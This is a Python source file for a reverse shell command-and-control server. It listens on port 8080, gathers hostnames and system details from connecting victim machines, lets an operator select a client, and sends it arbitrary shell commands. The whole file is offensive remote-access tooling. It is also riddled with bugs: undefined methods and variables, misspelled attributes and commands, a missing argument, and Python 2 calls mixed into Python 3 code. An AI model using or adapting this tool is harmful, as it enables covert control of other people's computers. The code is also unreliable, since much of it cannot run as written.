import socket
import gnureadline
import os
import logging
import sys
import signal
import time
import threading
from queue import Queue
import struct
import sys

gnureadline.parse_and_bind('tab: complete')
gnureadline.parse_and_bind('set editing-mode vi')

queue = Queue

root = logging.getLogger()
root.setLevel(logging.DEBUG)
handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.DEBUG)
handler.setFormatter(logging.Formatter('%(message)s'))
root.addHandler(handler)


class ReverseShell(object):
    """docstring for ReverseShell"""

    def __init__(self, HOST='0.0.0.0', PORT=8080, MAX_CONNECTIONS=1):
        self.PORT = PORT
        self.HOST = HOST
        self.MAX_CONNECTIONS = MAX_CONNECTIONS
        self.all_connections = []
        self.all_addresses = []

        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as e:
            logging.debug('[ERROR] Code : {}  Error : {}'.format(e[1], e[0]))
            sys.exit(1)

        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit)
        signal.signal(signal.SIGTERM, self.quit)
        return

    def bind_connection(self):
        try:

            try:
                self.connection.bind((self.HOST, self.PORT))
                self.connection.listen(self.MAX_CONNECTIONS)
                logging.debug('[SUCCESS] Listing on port {}'.format(self.PORT))

            except socket.error as e:
                print('[*] Address is been used sleeping for 10 seconds')
                time.sleep(10)
                self.bind_connection()

        except KeyboardInterrupt:
            print(' ')
            self.bind_connection()

        return

    def accept_connections(self):

        for c in self.all_connections:
            c.close()

        self.all_connections = []
        self.all_addresses = []

        while True:
            try:
                conn, addr = self.connection.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode('utf-8')
                addr = addr + (client_hostname, )
                self.all_connections.append(conn)
                self.all_addresses.append(addr)
                logging.debug(
                    '[+] Connection Is Estaablished {}'.format(addr[0]))

            except socket.error as e:
                logging.error(
                    '[ERROR] Accepting Connection {} {}'.format(e[0], e[1]))
                continue

            except KeyboardInterrupt:
                print(' ')
                self.accept_connections()
        return

    def list_connections(self):
        results = ''

        for index, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(2048)
            except Exception:
                del self.all_connection[index]
                del self.all_addresses[index]
                continue

            results += '{} {} {} {} \n'.format(index,
                                               self.all_connnections[index][0],
                                               self.all_addresses[index][1],
                                               self.all_addresses[index][2]
                                               )
            print(('----- Clients -----' + '\n' + results))

        return

    def select_connection(self, command):

        select = command.split(' ')[-1]

        try:
            select = int(select)
        except Exception:
            print('Selection most be intger')
            return None, None

        try:
            conn = self.all_connections[select]
        except IndexError:
            print('Connection  doesn\'t exists')
        print('[+] Current connection : {} '.format(
            self.all_addresses[select][2])
        )
        return select, conn

    def quit(self, signal=None, frame=None):
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()

            except socket.error as e:
                logging.debug(
                    '[ERROR] Code : {}  Error : {}'.format(e[1], e[0]))
                continue

        self.connection.close()
        sys.exit(0)

    def recvall(self, conn, n):
        data = b''

        while len(data) < n:

            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet

        return data

    def read_command_output(self, conn):
        raw_msglen = self.recvall(4)

        if not raw_msglen:
            return None

        msg_len = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(conn, msg_len)


class Consloe(ReverseShell):
    """docstring for Consloe."""

    def __init__(self):
        super(Consloe, self).__init__()

    def show_commands(self):
        print('''
            'help': ['Shows this help']
            'list': ['Lists connected clients']
            'select': ['Selects a client by its index. Takes index as a parameter']
            'quit': ['Stops current connection with a client. To be used when client is selected']
            'shutdown': ['Shuts server down']
            '''
              )

    def get_sys(self, info):
        op = 'Opertion System : ' + info[0]
        cn = 'Computer Name : ' + info[1]
        rv = 'Relese Version : ' + info[2]
        sv = 'System Version : ' + info[3]
        ma = 'Machine Architecture: ' + info[4]
        un = 'Username : ' + info[5]
        return [un, cn, op, sv, rv, ma]

    def send_target_commands(self, target, conn):
        try:
            conn.send(str.encode(' '))
        except Exception as e:
            logging.debug(
                '[ERROR] Code : {}  Error : {}'.format(e[1], e[0]))

        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, 'utf-8')
        print(cwd)

        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    clinet_response = str(cmd_output, 'utf-8')
                    print(clinet_response)

                if cmd == 'quit':
                    break
            except Exception as e:
                print('Connection was lost %s' % str(e))
                break

            del self.all_connections[target]
            del self.all_addresses[target]
            return

    def start(self):

        while True:
            cmd = raw_input('shell > ')

            if cmd == 'list':
                self.list_connections()
                continue

            elif cmd == 'help':
                self.show_commands()

            elif 'select' in cmd:
                target, conn = self.select_connection(cmd)
                if conn is not None:
                    self.send_commands(target, conn)

            elif cmd == 'shotdown':
                queue.task_down()
                queue.task_down()
                print('[*] Server is down')
                self.quit()

            elif cmd == '':
                continue

            else:
                print('Command not recognized')
        return


def work(console):
    while True:
        x = queue.get()
        if x == 1:
            console.socket_bind()
            console.accept_connections()
        if x == 2:
            console.start()
        queue.task_done()
    return


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return
